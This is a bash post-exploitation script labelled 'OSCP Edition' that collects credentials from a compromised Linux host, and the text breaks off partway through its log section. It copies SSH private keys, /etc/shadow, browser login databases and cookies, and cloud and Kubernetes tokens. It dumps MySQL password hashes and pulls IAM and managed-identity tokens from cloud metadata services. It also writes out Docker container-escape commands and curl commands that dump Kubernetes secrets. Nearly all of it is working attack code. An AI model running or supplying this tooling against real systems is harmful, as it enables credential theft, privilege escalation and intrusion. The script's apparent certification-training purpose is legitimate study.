#!/bin/bash
# =============================================================================
# loot.sh - Post-Exploitation Looting Script (OSCP Edition)
# Usage: ./loot.sh [output_dir]
# Covers: Home dirs, SSH, credentials, cloud, containers, K8s, databases,
#         web apps, logs, privesc artifacts, network, memory, backups, certs
# =============================================================================

RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
BLU='\033[0;34m'
CYN='\033[0;36m'
MAG='\033[0;35m'
NC='\033[0m'

LOOT_DIR="${1:-/tmp/.loot_$(date +%s)}"
HOSTNAME_=$(hostname 2>/dev/null || echo "unknown")
WHOAMI=$(whoami 2>/dev/null || id -un)
IS_ROOT=false
[[ "$EUID" -eq 0 || "$WHOAMI" == "root" ]] && IS_ROOT=true

mkdir -p "$LOOT_DIR"

log_info()  { echo -e "${BLU}[*]${NC} $1"; }
log_ok()    { echo -e "${GRN}[+]${NC} $1"; }
log_warn()  { echo -e "${YLW}[!]${NC} $1"; }
log_err()   { echo -e "${RED}[-]${NC} $1"; }
log_sec()   { echo -e "\n${CYN}[>>]${NC} ${CYN}$1${NC}"; }
log_hit()   { echo -e "${MAG}[!!] HIT:${NC} $1"; }

safe_copy() {
    local src="$1"
    local dst="$2"
    if [[ -f "$src" && -r "$src" ]]; then
        mkdir -p "$(dirname "$dst")"
        cp "$src" "$dst" 2>/dev/null && log_ok "Copied: $src" || log_err "Failed to copy: $src"
    elif [[ -f "$src" ]]; then
        log_warn "Exists but unreadable: $src"
    fi
}

safe_copy_dir() {
    local src="$1"
    local dst="$2"
    if [[ -d "$src" && -r "$src" ]]; then
        mkdir -p "$dst"
        cp -r "$src/." "$dst/" 2>/dev/null && log_ok "Copied dir: $src" || log_err "Partial copy: $src"
    elif [[ -d "$src" ]]; then
        log_warn "Dir exists but unreadable: $src"
    fi
}

# Append to the hits summary file
hit() { echo "$1" >> "$LOOT_DIR/HITS_SUMMARY.txt"; log_hit "$1"; }

echo -e """
${CYN}╔══════════════════════════════════════════════╗
║      loot.sh - OSCP Edition (Full)           ║
║  Home | SSH | Cloud | Docker | K8s | Logs   ║
╚══════════════════════════════════════════════╝${NC}
"""
log_info "Host:      $HOSTNAME_"
log_info "User:      $WHOAMI (root=$IS_ROOT)"
log_info "Loot Dir:  $LOOT_DIR"
echo "Loot started: $(date)" > "$LOOT_DIR/HITS_SUMMARY.txt"
echo "Host: $HOSTNAME_ | User: $WHOAMI | Root: $IS_ROOT" >> "$LOOT_DIR/HITS_SUMMARY.txt"
echo "============================================" >> "$LOOT_DIR/HITS_SUMMARY.txt"

# =============================================================================
# SYSTEM INFO SNAPSHOT
# =============================================================================
log_sec "System Snapshot"
INFO="$LOOT_DIR/system_info.txt"
{
    echo "=== Hostname ===" && hostname
    echo "=== Uname ===" && uname -a
    echo "=== Date ===" && date
    echo "=== Uptime ===" && uptime
    echo "=== Whoami ===" && whoami
    echo "=== ID ===" && id
    echo "=== Groups ===" && groups
    echo "=== IP Addresses ===" && (ip a 2>/dev/null || ifconfig 2>/dev/null)
    echo "=== Routing Table ===" && (ip r 2>/dev/null || route -n 2>/dev/null)
    echo "=== Listening Ports ===" && (ss -tlnup 2>/dev/null || netstat -tlnup 2>/dev/null)
    echo "=== Active Connections ===" && (ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null)
    echo "=== Environment ===" && env
    echo "=== Running Processes ===" && ps auxf 2>/dev/null
    echo "=== Logged In Users ===" && who && w
    echo "=== Last Logins ===" && last -n 20 2>/dev/null
    echo "=== Failed Logins ===" && lastb -n 20 2>/dev/null
    echo "=== Crontabs (system) ===" && cat /etc/crontab 2>/dev/null
    echo "=== Cron dirs ===" && ls -la /etc/cron* 2>/dev/null
    echo "=== Installed Packages ===" && (dpkg -l 2>/dev/null || rpm -qa 2>/dev/null)
    echo "=== SUID Binaries ===" && find / -perm -4000 -type f 2>/dev/null
    echo "=== SGID Binaries ===" && find / -perm -2000 -type f 2>/dev/null
    echo "=== World-Writable Files ===" && find / -writable -not -path "*/proc/*" -not -path "*/sys/*" -type f 2>/dev/null | head -100
    echo "=== Capabilities ===" && getcap -r / 2>/dev/null
    echo "=== Mounted Filesystems ===" && mount | column -t && df -h
    echo "=== /etc/fstab ===" && cat /etc/fstab 2>/dev/null
    echo "=== NFS Exports ===" && cat /etc/exports 2>/dev/null
    echo "=== OS Release ===" && cat /etc/os-release 2>/dev/null
    echo "=== Kernel Version ===" && uname -r
} > "$INFO" 2>&1
log_ok "System info saved"

# =============================================================================
# SECTION 1: HOME DIRECTORIES — ALL USERS
# =============================================================================
log_sec "Home Directories"

HOME_DIRS=()
while IFS=: read -r user _ uid _ _ home _; do
    [[ -d "$home" ]] && HOME_DIRS+=("$home")
done < /etc/passwd
for d in /home/* /root; do [[ -d "$d" ]] && HOME_DIRS+=("$d"); done
mapfile -t HOME_DIRS < <(printf '%s\n' "${HOME_DIRS[@]}" | sort -u)

SHELL_HISTORIES=(
    ".bash_history" ".zsh_history" ".sh_history" ".fish_history"
    ".mysql_history" ".psql_history" ".python_history"
    ".irb_history" ".node_history" ".lesshst" ".redis_history"
)

CREDENTIAL_FILES=(
    ".wget-hsts" ".git-credentials" ".npmrc" ".netrc" ".pgpass"
    ".ftprc" ".my.cnf" ".rhosts" ".rlogin" ".gitconfig"
    ".config/hub" ".config/gh/hosts.yml"
    ".vault-token" ".terraformrc"
    ".terraform.d/credentials.tfrc.json"
    ".config/op/config"
    ".config/rclone/rclone.conf"
    ".config/transmission/settings.json"
    ".chef/knife.rb" ".chef/credentials"
    ".puppet/puppet.conf"
    ".ansible/vault_pass"
)

CLOUD_FILES=(
    ".aws/credentials" ".aws/config"
    ".docker/config.json"
    ".kube/config"
    ".azure/accessTokens.json" ".azure/azureProfile.json"
    ".azure/msal_token_cache.json"
    ".config/gcloud/credentials.db"
    ".config/gcloud/legacy_credentials"
    ".config/gcloud/application_default_credentials.json"
    ".config/gcloud/properties"
    ".digitalocean/access-token"
    ".config/digitalocean/access-token"
    ".config/linode-cli" ".linodecli"
    ".helm/repository/repositories.yaml"
)

for HOME in "${HOME_DIRS[@]}"; do
    USERNAME=$(basename "$HOME")
    log_info "Looting home: $HOME ($USERNAME)"
    DEST="$LOOT_DIR/homes/$USERNAME"

    for f in "${SHELL_HISTORIES[@]}"; do
        safe_copy "$HOME/$f" "$DEST/history/$f"
    done

    for f in "${CREDENTIAL_FILES[@]}"; do
        [[ -f "$HOME/$f" ]] && safe_copy "$HOME/$f" "$DEST/creds/$f" && \
            hit "Credential file: $HOME/$f"
    done

    for f in "${CLOUD_FILES[@]}"; do
        [[ -f "$HOME/$f" ]] && safe_copy "$HOME/$f" "$DEST/cloud/$f" && \
            hit "Cloud credential: $HOME/$f"
    done

    # Full gcloud dir
    safe_copy_dir "$HOME/.config/gcloud" "$DEST/cloud/gcloud"
    safe_copy_dir "$HOME/.azure" "$DEST/cloud/azure"

    # SSH material
    if [[ -d "$HOME/.ssh" ]]; then
        mkdir -p "$DEST/ssh"
        for f in "$HOME"/.ssh/*; do
            [[ -f "$f" ]] && safe_copy "$f" "$DEST/ssh/$(basename "$f")"
        done
        for f in "$HOME"/.ssh/id_* "$HOME"/.ssh/*.pem "$HOME"/.ssh/*.key; do
            if [[ -f "$f" ]] && grep -q "PRIVATE KEY" "$f" 2>/dev/null; then
                hit "SSH private key: $f"
            fi
        done
        log_ok "SSH dir looted: $HOME/.ssh"
    fi

    # GPG
    safe_copy_dir "$HOME/.gnupg" "$DEST/gnupg"

    # Firefox
    for profile_dir in "$HOME"/.mozilla/firefox/*.default* \
                       "$HOME"/.mozilla/firefox/*.default-release; do
        if [[ -d "$profile_dir" ]]; then
            mkdir -p "$DEST/firefox"
            for f in logins.json key4.db cert9.db cookies.sqlite; do
                safe_copy "$profile_dir/$f" "$DEST/firefox/$f"
            done
            hit "Firefox profile: $profile_dir"
        fi
    done

    # Chrome/Chromium
    for chrome_dir in "$HOME/.config/google-chrome/Default" \
                      "$HOME/.config/chromium/Default"; do
        if [[ -d "$chrome_dir" ]]; then
            mkdir -p "$DEST/chrome"
            safe_copy "$chrome_dir/Login Data" "$DEST/chrome/Login_Data"
            safe_copy "$chrome_dir/Cookies"    "$DEST/chrome/Cookies"
            hit "Chrome profile: $chrome_dir"
        fi
    done

    # User crontab
    CRON=$(crontab -l -u "$USERNAME" 2>/dev/null)
    if [[ -n "$CRON" ]]; then
        echo "$CRON" > "$DEST/crontab.txt"
        log_ok "Crontab saved for $USERNAME"
    fi

done

# =============================================================================
# SECTION 2: SYSTEM CREDENTIALS
# =============================================================================
log_sec "System Credential Files"
SYS="$LOOT_DIR/system"

safe_copy "/etc/passwd"      "$SYS/passwd"
safe_copy "/etc/group"       "$SYS/group"
safe_copy "/etc/hosts"       "$SYS/hosts"
safe_copy "/etc/hostname"    "$SYS/hostname"
safe_copy "/etc/resolv.conf" "$SYS/resolv.conf"
safe_copy "/etc/fstab"       "$SYS/fstab"
safe_copy "/etc/exports"     "$SYS/nfs_exports"
safe_copy "/etc/os-release"  "$SYS/os-release"

if $IS_ROOT; then
    safe_copy "/etc/shadow"  "$SYS/shadow"  && hit "/etc/shadow captured — crack with hashcat/john!"
    safe_copy "/etc/gshadow" "$SYS/gshadow"
else
    log_warn "Not root — skipping /etc/shadow"
    [[ -r "/etc/shadow" ]] && safe_copy "/etc/shadow" "$SYS/shadow" && \
        hit "/etc/shadow world-readable! (misconfigured perms)"
fi

# =============================================================================
# SECTION 3: SUDO & PAM
# =============================================================================
log_sec "Sudo & PAM"

safe_copy "/etc/sudoers" "$SYS/sudoers"
safe_copy_dir "/etc/sudoers.d" "$SYS/sudoers.d"
safe_copy_dir "/etc/pam.d"     "$SYS/pam.d"
safe_copy_dir "/etc/security"  "$SYS/security"

SUDO_OUT=$(sudo -l 2>/dev/null)
if [[ -n "$SUDO_OUT" ]]; then
    echo "$SUDO_OUT" > "$SYS/sudo_l_current_user.txt"
    log_ok "sudo -l output saved"
    echo "$SUDO_OUT" | grep -qi "NOPASSWD" && hit "NOPASSWD sudo rule found for $WHOAMI!"
fi

# =============================================================================
# SECTION 4: SSH SERVER & KEY HUNTING
# =============================================================================
log_sec "SSH Server & Key Hunt"
SSH_SYS="$LOOT_DIR/ssh_server"

safe_copy "/etc/ssh/sshd_config" "$SSH_SYS/sshd_config"
safe_copy_dir "/etc/ssh" "$SSH_SYS/etc_ssh"

# SSH agent sockets
AGENT_SOCKETS=$(find /tmp /run /var/run -name "agent.*" -o -name "ssh-*" 2>/dev/null | grep -i ssh)
if [[ -n "$AGENT_SOCKETS" ]]; then
    echo "$AGENT_SOCKETS" > "$SSH_SYS/agent_sockets.txt"
    hit "SSH agent socket(s) found — try: SSH_AUTH_SOCK=<socket> ssh-add -l"
fi

# Active SSH sessions for hijack
SSH_SESSIONS=$(ps aux 2>/dev/null | grep "sshd:" | grep -v grep)
if [[ -n "$SSH_SESSIONS" ]]; then
    echo "$SSH_SESSIONS" > "$SSH_SYS/active_ssh_sessions.txt"
    hit "Active SSH sessions found — see ssh_server/active_ssh_sessions.txt"
fi

# System-wide private key search
log_info "Hunting for private keys system-wide..."
KEYS_DIR="$SSH_SYS/keys_found"
mkdir -p "$KEYS_DIR"
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o \
    -type f \( -name "*.pem" -o -name "*.key" -o -name "*.ppk" \
    -o -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
    -o -name "id_dsa" -o -name "id_xmss" \) -print 2>/dev/null | \
    while read -r keyfile; do
        if [[ -r "$keyfile" ]] && grep -q "PRIVATE KEY" "$keyfile" 2>/dev/null; then
            safe_copy "$keyfile" "$KEYS_DIR/$(echo "$keyfile" | tr '/' '_')"
            hit "Private key: $keyfile"
        fi
    done
log_ok "Private key hunt complete — see ssh_server/keys_found/"

# =============================================================================
# SECTION 5: DATABASE CREDENTIALS & CONFIGS
# =============================================================================
log_sec "Database Credentials"
DB="$LOOT_DIR/databases"

# MySQL / MariaDB
safe_copy_dir "/etc/mysql"           "$DB/mysql/etc"
safe_copy "/root/.my.cnf"            "$DB/mysql/root_my.cnf"
safe_copy "/etc/mysql/my.cnf"        "$DB/mysql/my.cnf"
# Grab MySQL user table if root and mysql is available
if $IS_ROOT && command -v mysql &>/dev/null; then
    mysql -u root --batch -e "SELECT user,host,authentication_string FROM mysql.user;" \
        2>/dev/null > "$DB/mysql/mysql_users.txt" && \
        hit "MySQL users dumped — see databases/mysql/mysql_users.txt"
fi

# PostgreSQL
safe_copy_dir "/etc/postgresql"      "$DB/postgres/etc"
find /etc/postgresql -name "pg_hba.conf" -readable 2>/dev/null | \
    while read -r f; do safe_copy "$f" "$DB/postgres/pg_hba.conf"; done

# Redis
safe_copy "/etc/redis/redis.conf"    "$DB/redis/redis.conf"
safe_copy "/etc/redis.conf"          "$DB/redis/redis.conf.alt"
grep -i "requirepass" /etc/redis/redis.conf /etc/redis.conf 2>/dev/null | \
    grep -v "^#" > "$DB/redis/redis_password.txt" 2>/dev/null
[[ -s "$DB/redis/redis_password.txt" ]] && hit "Redis requirepass found!"

# MongoDB
safe_copy "/etc/mongod.conf"         "$DB/mongo/mongod.conf"
safe_copy "/etc/mongodb.conf"        "$DB/mongo/mongodb.conf"

# SQLite databases (copy if under 10MB)
log_info "Searching for SQLite databases..."
find /var/www /opt /home /srv -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \
    2>/dev/null | while read -r dbfile; do
        if [[ -r "$dbfile" && $(stat -c%s "$dbfile" 2>/dev/null) -lt 10485760 ]]; then
            safe_copy "$dbfile" "$DB/sqlite/$(echo "$dbfile" | tr '/' '_')"
            hit "SQLite DB: $dbfile"
        fi
    done

# /var/lib/mysql — if root, list tables for manual dumping
if $IS_ROOT && [[ -d /var/lib/mysql ]]; then
    ls -la /var/lib/mysql > "$DB/mysql/var_lib_mysql_listing.txt" 2>/dev/null
    log_ok "MySQL data dir listing saved"
fi

# =============================================================================
# SECTION 6: WEB APPLICATION CREDENTIALS
# =============================================================================
log_sec "Web Application Credentials"
APP="$LOOT_DIR/apps"

# Web server core configs
for f in \
    "/etc/apache2/apache2.conf" "/etc/apache2/.htpasswd" \
    "/etc/apache2/sites-enabled/000-default.conf" \
    "/etc/nginx/nginx.conf" "/etc/nginx/sites-enabled/default" \
    "/etc/httpd/conf/httpd.conf" "/usr/local/etc/nginx/nginx.conf"; do
    safe_copy "$f" "$APP/webserver/$(basename "$f")"
done

# Common app config files — search all web roots + /opt + /srv
log_info "Searching web roots for config files..."
APP_CONFIG_PATTERNS=(
    "wp-config.php" "config.php" "configuration.php"
    "settings.py" "settings.php" "local_settings.py"
    "database.yml" "database.php" "db.php"
    "config.yml" "config.yaml" "config.json" "config.js"
    "application.properties" "application.yml"
    "parameters.yml" "parameters.php"
    ".env" ".env.local" ".env.production" ".env.backup" ".env.example"
    "web.config" "appsettings.json"
    "Gemfile" "secrets.yml" "master.key" "credentials.yml.enc"
)

for pattern in "${APP_CONFIG_PATTERNS[@]}"; do
    find /var/www /srv/www /opt /srv /usr/local/www \
        -name "$pattern" -readable 2>/dev/null | \
        while read -r cf; do
            safe_copy "$cf" "$APP/configs/$(echo "$cf" | tr '/' '_')"
            hit "App config: $cf"
        done
done

# .git directories (may contain secrets in history)
log_info "Searching for .git directories..."
find /var/www /opt /srv /home -type d -name ".git" -readable 2>/dev/null | \
    while read -r gitdir; do
        repo=$(dirname "$gitdir")
        slug=$(echo "$repo" | tr '/' '_')
        mkdir -p "$APP/git/$slug"
        safe_copy "$gitdir/config" "$APP/git/$slug/git_config"
        git -C "$repo" log --oneline -20 2>/dev/null > "$APP/git/$slug/git_log_20.txt"
        hit ".git found: $gitdir — check git_config for embedded remote creds"
    done

# Backup files in web roots / common dirs
log_info "Searching for backup/archive files..."
find /var/www /opt /srv /tmp /var/backups \
    -type f \( -name "*.bak" -o -name "*.backup" -o -name "*.old" \
    -o -name "*.orig" -o -name "*.save" -o -name "*.swp" \
    -o -name "*.tar" -o -name "*.tar.gz" -o -name "*.tgz" \
    -o -name "*.zip" -o -name "*.gz" -o -name "*.7z" -o -name "*.rar" \) \
    -readable 2>/dev/null | head -50 | \
    while read -r bf; do
        SIZE=$(stat -c%s "$bf" 2>/dev/null)
        echo "$bf ($(numfmt --to=iec $SIZE 2>/dev/null || echo "${SIZE}B"))" >> "$APP/backup_files_found.txt"
        hit "Backup/archive file: $bf"
    done

# Grep for hardcoded secrets in web roots and /opt
log_info "Grepping for hardcoded credentials..."
GREP_DIRS="/var/www /opt /srv /etc /usr/local"
{
    echo "=== Files matching credential patterns ==="
    grep -rsiEl \
        "(password|passwd|secret|apikey|api_key|api_secret|token|oauth|credential|auth_key|private_key)\s*[=:]\s*.+" \
        $GREP_DIRS \
        --include="*.conf" --include="*.cfg" --include="*.ini" \
        --include="*.php" --include="*.py" --include="*.rb" \
        --include="*.js" --include="*.ts" --include="*.env" \
        --include="*.xml" --include="*.yaml" --include="*.yml" \
        --include="*.json" --include="*.properties" \
        2>/dev/null | head -50

    echo ""
    echo "=== Matching lines ==="
    grep -rsiEh \
        "(password|passwd|secret|apikey|api_key|api_secret|token|oauth|credential|auth_key|private_key)\s*[=:]\s*\S+" \
        $GREP_DIRS \
        --include="*.conf" --include="*.cfg" --include="*.ini" \
        --include="*.php" --include="*.py" --include="*.rb" \
        --include="*.js" --include="*.ts" --include="*.env" \
        --include="*.xml" --include="*.yaml" --include="*.yml" \
        --include="*.json" --include="*.properties" \
        2>/dev/null | grep -v "^#" | grep -v "example\|dummy\|placeholder\|changeme\|your_" | head -300
} > "$APP/grepped_creds.txt" 2>&1
log_ok "Credential grep saved to apps/grepped_creds.txt"

# Docker volumes — search for app configs
for volroot in /var/lib/docker/volumes /mnt /media; do
    if $IS_ROOT && [[ -d "$volroot" ]]; then
        log_info "Searching Docker/mount volumes at $volroot..."
        for pattern in "${APP_CONFIG_PATTERNS[@]}"; do
            find "$volroot" -name "$pattern" -readable 2>/dev/null | \
                while read -r vf; do
                    safe_copy "$vf" "$APP/docker_volumes/$(echo "$vf" | tr '/' '_')"
                    hit "Volume config: $vf"
                done
        done
    fi
done

# Environment/profile files
for f in /etc/environment /etc/profile /etc/bash.bashrc /etc/profile.d/*.sh; do
    safe_copy "$f" "$APP/env_profiles/$(basename "$f")"
done

# =============================================================================
# SECTION 7: DOCKER & CONTAINER CREDENTIALS
# =============================================================================
log_sec "Docker & Container Secrets"
DOCK="$LOOT_DIR/docker"
mkdir -p "$DOCK"

# Docker socket — highest impact
if [[ -S /var/run/docker.sock ]]; then
    if [[ -r /var/run/docker.sock ]]; then
        hit "Docker socket accessible! (/var/run/docker.sock) — full container escape possible"
        echo "docker socket is accessible for $WHOAMI" > "$DOCK/DOCKER_SOCKET_ACCESSIBLE.txt"
        {
            echo "# Escape to root shell:"
            echo "docker run -it --rm -v /:/mnt alpine chroot /mnt sh"
            echo ""
            echo "# Or mount host:"
            echo "docker run -v /:/host -it ubuntu bash"
        } >> "$DOCK/DOCKER_SOCKET_ACCESSIBLE.txt"

        docker ps -a    2>/dev/null > "$DOCK/containers.txt"
        docker images   2>/dev/null > "$DOCK/images.txt"
        docker network ls 2>/dev/null > "$DOCK/networks.txt"
        docker volume ls  2>/dev/null > "$DOCK/volumes.txt"

        # Inspect all containers for env vars
        docker ps -q 2>/dev/null | while read -r cid; do
            docker inspect "$cid" 2>/dev/null > "$DOCK/inspect_${cid}.json"
            docker inspect "$cid" 2>/dev/null | \
                grep -iE '"(PASSWORD|SECRET|KEY|TOKEN|API|CRED).*":' \
                >> "$DOCK/container_env_secrets.txt" 2>/dev/null
            hit "Docker container $cid inspected"
        done
        [[ -s "$DOCK/container_env_secrets.txt" ]] && \
            hit "Secrets found in container environments! (docker/container_env_secrets.txt)"
    else
        log_warn "Docker socket exists but not readable (not in docker group)"
    fi
    id | grep -q "docker" && hit "Current user is in the docker group!"
fi

# /etc/docker
safe_copy "/etc/docker/daemon.json" "$DOCK/daemon.json"
safe_copy_dir "/etc/docker" "$DOCK/etc_docker"

# Docker volumes — search for secrets if root
if $IS_ROOT && [[ -d /var/lib/docker/volumes ]]; then
    log_info "Searching Docker volumes for secrets..."
    find /var/lib/docker/volumes -type f \
        \( -name "*.env" -o -name "*.conf" -o -name "*.json" \
        -o -name "wp-config.php" -o -name "settings.py" \
        -o -name "*.key" -o -name "*.pem" \) \
        -readable 2>/dev/null | while read -r vf; do
            safe_copy "$vf" "$DOCK/volumes_loot/$(echo "$vf" | tr '/' '_')"
            hit "Docker volume file: $vf"
        done
fi

# Are we inside a container?
if [[ -f /.dockerenv ]]; then
    hit "Running INSIDE a Docker container (/.dockerenv present)"
    echo "Inside container" > "$DOCK/INSIDE_CONTAINER.txt"
    cat /proc/1/cgroup 2>/dev/null >> "$DOCK/INSIDE_CONTAINER.txt"
fi
grep -q "docker\|lxc\|containerd" /proc/1/cgroup 2>/dev/null && \
    hit "cgroup indicates containerized environment"

# =============================================================================
# SECTION 8: KUBERNETES SECRETS
# =============================================================================
log_sec "Kubernetes Secrets"
K8S="$LOOT_DIR/kubernetes"
mkdir -p "$K8S"

# System-level kubeconfigs
for f in /etc/kubernetes/admin.conf \
         /etc/kubernetes/scheduler.conf \
         /etc/kubernetes/controller-manager.conf \
         /root/.kube/config; do
    [[ -f "$f" && -r "$f" ]] && safe_copy "$f" "$K8S/$(basename "$f")" && \
        hit "kubeconfig: $f"
done
safe_copy_dir "/etc/kubernetes" "$K8S/etc_kubernetes"

# Service account tokens (inside a pod)
SA_DIR="/var/run/secrets/kubernetes.io/serviceaccount"
if [[ -d "$SA_DIR" ]]; then
    safe_copy_dir "$SA_DIR" "$K8S/service_account"
    hit "K8s service account token found — running inside a pod!"
    TOKEN=$(cat "$SA_DIR/token" 2>/dev/null)
    CACERT="$SA_DIR/ca.crt"
    NAMESPACE=$(cat "$SA_DIR/namespace" 2>/dev/null)
    {
        echo "Namespace: $NAMESPACE"
        echo ""
        echo "# Check permissions:"
        echo "curl -sk --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" \\"
        echo "  https://\$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$NAMESPACE/secrets"
        echo ""
        echo "# List pods:"
        echo "curl -sk --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" \\"
        echo "  https://\$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$NAMESPACE/pods"
        echo ""
        echo "# Dump all secrets:"
        echo "curl -sk --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" \\"
        echo "  https://\$KUBERNETES_SERVICE_HOST/api/v1/secrets"
    } > "$K8S/exploitation_commands.txt"
fi

# etcd check
if command -v etcdctl &>/dev/null || [[ -S /var/run/etcd/etcd.sock ]]; then
    hit "etcd may be accessible — all K8s secrets could be dumped!"
    echo "etcdctl may be available" > "$K8S/ETCD_ACCESSIBLE.txt"
fi

# =============================================================================
# SECTION 9: CLOUD METADATA & IAM
# =============================================================================
log_sec "Cloud Metadata & IAM Roles"
CLOUD="$LOOT_DIR/cloud_metadata"
mkdir -p "$CLOUD"

# AWS IMDSv1
log_info "Probing AWS metadata service (IMDSv1)..."
AWS_META=$(curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null)
if [[ -n "$AWS_META" ]]; then
    hit "AWS metadata service accessible (IMDSv1)!"
    {
        echo "=== Instance Identity ==="
        curl -sf http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null
        echo ""
        echo "=== IAM Role Name ==="
        ROLE=$(curl -sf http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
        echo "Role: $ROLE"
        echo ""
        echo "=== IAM Credentials ==="
        curl -sf "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null
        echo ""
        echo "=== User Data (may contain secrets!) ==="
        curl -sf http://169.254.169.254/latest/user-data 2>/dev/null
    } > "$CLOUD/aws_imdsv1.txt"
fi

# AWS IMDSv2
IMDS_TOKEN=$(curl -sf --connect-timeout 2 -X PUT \
    "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
if [[ -n "$IMDS_TOKEN" ]]; then
    hit "AWS metadata service accessible (IMDSv2)!"
    {
        curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
            http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null
        ROLE=$(curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
            http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
        echo "IAM Role: $ROLE"
        curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null
        echo ""
        echo "=== User Data ==="
        curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
            http://169.254.169.254/latest/user-data 2>/dev/null
    } > "$CLOUD/aws_imdsv2.txt"
fi

# GCP metadata
log_info "Probing GCP metadata service..."
GCP_META=$(curl -sf --connect-timeout 2 \
    -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null)
if [[ -n "$GCP_META" ]]; then
    hit "GCP metadata service accessible!"
    {
        echo "=== Service Accounts ==="
        curl -sf -H "Metadata-Flavor: Google" \
            http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>/dev/null
        echo ""
        echo "=== Default SA Token ==="
        curl -sf -H "Metadata-Flavor: Google" \
            http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null
        echo ""
        echo "=== Project Info ==="
        curl -sf -H "Metadata-Flavor: Google" \
            http://metadata.google.internal/computeMetadata/v1/project/ 2>/dev/null
        echo ""
        echo "=== Instance Attributes (may contain startup scripts with secrets) ==="
        curl -sf -H "Metadata-Flavor: Google" \
            http://metadata.google.internal/computeMetadata/v1/instance/attributes/ 2>/dev/null
    } > "$CLOUD/gcp_metadata.txt"
fi

# Azure IMDS + MSI
log_info "Probing Azure metadata service..."
AZ_META=$(curl -sf --connect-timeout 2 \
    -H "Metadata: true" \
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
if [[ -n "$AZ_META" ]]; then
    hit "Azure metadata service accessible!"
    {
        echo "=== Instance Info ==="
        echo "$AZ_META"
        echo ""
        echo "=== MSI Token (management.azure.com) ==="
        curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
            2>/dev/null
        echo ""
        echo "=== MSI Token (vault.azure.net) ==="
        curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
            2>/dev/null
    } > "$CLOUD/azure_metadata.txt"
fi

# GCP service account JSON files
log_info "Searching for GCP service account JSON files..."
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o \
    -name "*.json" -readable -print 2>/dev/null | \
    xargs grep -sl '"type": "service_account"' 2>/dev/null | \
    while read -r sa; do
        safe_copy "$sa" "$CLOUD/gcp_sa_$(basename "$sa")"
        hit "GCP service account JSON: $sa"
    done

# =============================================================================
# SECTION 10: CERTIFICATES, VPN & BASTION CONFIGS
# =============================================================================
log_sec "Certificates, Keys & VPN Configs"
CERTS="$LOOT_DIR/certs_vpn"
mkdir -p "$CERTS"

# VPN configs
log_info "Searching for VPN config files..."
for d in /etc/openvpn /etc/wireguard /etc/strongswan /etc/ipsec.d; do
    safe_copy_dir "$d" "$CERTS/vpn/$(basename "$d")" && \
        hit "VPN config dir: $d"
done
find / \( -path /proc -o -path /sys \) -prune -o \
    -type f -name "*.ovpn" -readable -print 2>/dev/null | \
    while read -r vpn; do
        safe_copy "$vpn" "$CERTS/vpn/$(basename "$vpn")"
        hit "OpenVPN config: $vpn"
    done

# SSH bastion configs
find /home /root /etc/ssh -name "config" -readable 2>/dev/null | \
    while read -r sc; do
        safe_copy "$sc" "$CERTS/ssh_configs/$(echo "$sc" | tr '/' '_')"
    done

# Certificates and keystores
log_info "Searching for private certs/keystores..."
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o \
    -type f \( -name "*.p12" -o -name "*.pfx" -o -name "*.jks" \
    -o -name "*.crt" -o -name "*.cer" \) \
    -readable -print 2>/dev/null | \
    while read -r cert; do
        safe_copy "$cert" "$CERTS/certs/$(echo "$cert" | tr '/' '_')"
    done

# =============================================================================
# SECTION 11: HIGH-VALUE LOGS
# =============================================================================
log_sec "High-Value Logs"
LOGS="$LOOT_DIR/logs"
mkdir -p "$LOGS"

# Auth logs
for logfile in /var/log/auth.log /var/log/secure \
               /var/log/syslog /var/log/messages; do
    if [[ -f "$logfile" && -r "$logfile" ]]; then
        safe_copy "$logfile" "$LOGS/$(basename "$logfile")"
        grep -iE "(accepted|failed|invalid|sudo|su:|session opened|password|publickey)" \
            "$logfile" 2>/dev/null | tail -500 \
            > "$LOGS/$(basename "$logfile")_filtered.txt"
        log_ok "Log saved: $logfile"
    fi
done

# Web access logs — extract credentials from query strings
for logdir in /var/log/apache2 /var/log/nginx /var/log/httpd; do
    if [[ -d "$logdir" && -r "$logdir" ]]; then
        mkdir -p "$LOGS/$(basename "$logdir")"
        for lf in "$logdir"/*.log "$logdir"/*.log.1; do
            [[ -f "$lf" && -r "$lf" ]] && \
                safe_copy "$lf" "$LOGS/$(basename "$logdir")/$(basename "$lf")"
        done
        # Creds in query strings
        grep -ihE "(pass(word)?|token|api_?key|secret|auth)=[^&\s\"']+" \
            "$logdir"/*.log 2>/dev/null | head -100 \
            > "$LOGS/$(basename "$logdir")/possible_creds_in_logs.txt"
